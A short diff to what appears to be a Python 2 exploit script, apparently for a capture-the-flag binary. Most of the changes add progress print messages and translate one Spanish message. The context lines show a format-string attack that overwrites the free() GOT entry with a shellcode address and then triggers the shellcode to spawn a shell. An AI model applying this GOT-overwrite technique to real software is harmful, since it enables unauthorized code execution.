@@ -55,6 +55,8 @@ def main():
 	payload += p64(free_GOT)
 	conn.sendline( payload )
 	conn.recvuntil('> ')
+	print 'free GOT address wiped'
+	print ''
 
 	# overwrite free got adddr
 	sh_bytes = hex(shellcode_addr)[2:]
@@ -63,6 +65,8 @@ def main():
 	b3 = (0, int(sh_bytes[4:6],   16))
 	sh_bytes = [b1, b2, b3]
 
+	print 'writing shellcode address in free GOT...'
+	print ''
 	for sh_byte in sh_bytes:
 		pos, lenght = sh_byte
 		if lenght < 8:
@@ -72,7 +76,7 @@ def main():
 		else:
 			conn.sendline('2')
 			conn.recvuntil(nombre)
-			print 'escribo:' + hex(lenght)
+			print 'write:' + hex(lenght)
 			extra = len(str(lenght))
 			payload  = '%{:d}x'.format(lenght - (8 - extra))
 			payload += ' ' * (8 - extra)
@@ -83,6 +87,8 @@ def main():
 
 	print 'new free addr:' + hex(read_addr(free_GOT))
 	#print 'shellcode:' + read_addr(shellcode_addr, text=True)
+	print 'executing shellcode and getting shell...'
+	print ''
 
 	# write shellcode and execute its execution
 	conn.sendline('3')
